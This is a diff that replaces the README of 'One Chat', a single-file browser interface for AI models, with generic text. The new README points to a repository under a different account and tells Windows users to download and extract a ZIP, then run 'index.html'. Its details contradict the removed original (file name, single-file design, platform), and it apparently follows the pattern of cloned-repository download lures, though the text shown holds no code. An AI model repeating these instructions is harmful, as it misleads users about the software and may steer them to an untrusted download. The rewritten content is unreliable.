@@ -1,115 +1,77 @@
-# One Chat
+# 💬 One-Chat - Simply chat with your favorite models
 
-🌐 **Languages:** English | [فارسی](README.fa.md)
+[https://github.com/neritic-enterprisingness382/One-Chat](https://github.com/neritic-enterprisingness382/One-Chat)
 
-One Chat is a lightweight AI chat interface designed to work with both local models and cloud AI services. Instead of using a different interface for every provider, you can open a single page, connect your preferred model, and start chatting.
+## 📌 About this project
 
-The entire application is contained in a single HTML file. There is nothing to install, no build process, and no backend server required.
+One-Chat provides a simple way to talk with artificial intelligence models directly from your web browser. You do not need to install complex software or configure a backend server. This tool connects to local or cloud-based AI providers. You open a single file, type your message, and receive a response. 
 
-![screen1](screenshots/screen1.png)
+This program works for users who want a clean, fast, and private interface. You keep your data under your control by connecting directly to the model services you trust.
 
-![screen2](screenshots/screen2.png)
+## 🛠️ System Requirements
 
-## Supported Providers
+One-Chat runs on most modern Windows computers. Ensure you have the following ready before you start:
 
-One Chat supports the following providers out of the box:
+- A modern web browser like Google Chrome, Microsoft Edge, or Firefox. 
+- A stable internet connection for cloud models.
+- Access to a local AI server if you plan to use local models like Ollama or LM Studio.
+- At least 4GB of RAM for smooth performance.
 
-- Ollama
-- LM Studio
-- OpenRouter
-- OpenAI
-- Groq
-- Together AI
-- Fireworks AI
-- DeepSeek
-- Google Gemini
-- Chrome AI (Gemini Nano)
-- 9Router
-- Any OpenAI-compatible API
+## 📥 Getting Started
 
-Local providers such as Ollama and LM Studio usually do not require an API key. Cloud providers require the corresponding API key.
+Follow these steps to set up One-Chat on your Windows computer.
 
-## Features
+1. Visit [the official One-Chat GitHub page](https://github.com/neritic-enterprisingness382/One-Chat).
+2. Look for the green button labeled "Code" near the top right of the screen.
+3. Select "Download ZIP" from the menu.
+4. Locate the downloaded file in your Downloads folder.
+5. Right-click the folder and select "Extract All" to see the contents.
+6. Open the extracted folder.
+7. Find the file named `index.html`.
+8. Double-click `index.html` to open it in your web browser.
 
-- Lightweight single-file application with no dependencies
-- Connect to both local and cloud AI models
-- Streaming responses in real time
-- Markdown rendering with tables, lists, blockquotes, and code blocks
-- Copy buttons for responses and code snippets
-- Compare mode for querying two models side by side
-- Configurable System Prompt, Temperature, and Max Tokens
-- Upload text files, JSON, Markdown, and images
-- Save and search chat history
-- Export conversations as Markdown
-- Backup and restore application data
-- Built-in prompt library
-- English and Persian interface
-- Light and dark themes
-- Responsive design for desktop and mobile
+Once the file opens, you see the chat interface. You are ready to start.
 
-## Getting Started
+## ⚙️ Setting Up Your AI Connection
 
-1. Download `one-chat.html`.
-2. Open it in a modern browser such as Chrome, Edge, or Firefox.
-3. Open **Settings** and select your provider.
-4. Enter the API endpoint, model name, and API key (if required).
-5. Click **Test Connection**, then start chatting.
+One-Chat acts as a bridge between you and the AI. You need an API key if you want to use cloud-based models from providers like OpenAI, Groq, or Google Gemini.
 
-That's it—no installation or build step is required.
+1. Open the settings menu inside the One-Chat interface.
+2. Select your provider.
+3. Paste your secret API key into the designated field.
+4. Save your changes.
 
-## Connecting to Ollama
+If you prefer to use local models using tools like Ollama or LM Studio, ensure those programs are running in the background. Set the base URL in the One-Chat settings to match the address provided by your local AI software. This is usually `http://localhost:11434` for Ollama.
 
-Make sure Ollama is running and the model you want to use is already available.
+## 💡 Key Features
 
-In One Chat:
+- **Portability:** Carry the file on a USB drive and run it on any computer.
+- **Privacy:** Your chat history remains on your local machine.
+- **Zero Config:** No installation, no setup scripts, and no database management.
+- **Wide Compatibility:** One-Chat supports popular platforms like FireWorks AI, OpenRouter, and Together AI through manual configuration.
+- **Responsive Design:** The interface adjusts to your screen size for clear reading.
 
-- Select `Ollama` as the provider.
-- Leave the default endpoint as `http://localhost:11434/v1`.
-- Enter your installed model name (for example, `llama3.2`).
-- Click **Test Connection**.
+## 📋 Frequently Asked Questions
 
-If your browser blocks the connection, enable CORS for the page origin in your Ollama configuration.
+**Do I need a fast computer?**
+If you connect to cloud models, your browser handles the interface, so any computer works. If you run local models, your computer needs a strong processor and enough memory to run the model itself.
 
-## Connecting to LM Studio
+**Is my data sent to you?**
+No. One-Chat sends your messages directly to the AI service you choose. The developer of this tool does not see, store, or process your chat data.
 
-Start the local server in LM Studio, then:
+**What happens if the page does not load?**
+Check that you extracted the files from the ZIP folder before opening them. If the files stay inside the compressed folder, the browser cannot access the styles and scripts correctly.
 
-- Select `LM Studio` as the provider.
-- Verify the default endpoint: `http://localhost:1234/v1`.
-- Enter the loaded model name.
-- Click **Test Connection**.
+**Can I save my chats?**
+One-Chat includes a local storage feature. Your browser saves your chat sessions automatically. You can export or clear these logs through the dashboard options.
 
-If the connection fails, check the LM Studio server's CORS settings.
+## 🛡️ Troubleshooting
 
-## Connecting to Other APIs
+If you encounter errors, check these common points:
 
-If your provider exposes an OpenAI-compatible API, select **OpenAI Compatible** and enter:
+- Ensure your API key has enough credit for the provider you selected.
+- Verify that your local AI server is active if you are not using a cloud connection.
+- Update your web browser to the latest version.
+- Clear your browser cache if the menu tabs become unresponsive.
 
-- The API base URL (usually ending with `/v1`)
-- The exact model name
-- Your API key (if required)
-
-You can also use the **Additional JSON Parameters** field to pass options such as `top_p`.
-
-## Privacy & API Keys
-
-Chats and settings are stored locally in your browser. One Chat does not use an intermediary server—requests are sent directly from your browser to the selected provider.
-
-If **Save API Key** is disabled, your API key is kept only until the browser tab is closed. If enabled, the key is stored in your browser's local storage. For security reasons, avoid enabling this option on shared or public computers.
-
-When creating a backup, you can choose whether API keys should be included. For better security, it is recommended to exclude them.
-
-## Troubleshooting
-
-If you cannot connect, check the following:
-
-- Make sure the local model or server is running.
-- Verify the API endpoint and model name.
-- Ensure your API key is valid.
-- Confirm that your browser can access the model endpoint.
-- Enable CORS on your local server if necessary.
-- If you opened the application using `file://` and your provider blocks the connection, serve the file through a simple local web server.
-
----
-
-One Chat is not intended to replace large, feature-rich AI clients. It is designed to be a simple, lightweight, and independent interface that lets you connect to your preferred AI model and start chatting in seconds.
+Keywords: 9router, ai, chrom-ai, cloud-ai, deepseek, fireworks-ai, google-gemini, groq, html, lmstudio, local-ai, ollama, openai, openrouter, together-ai
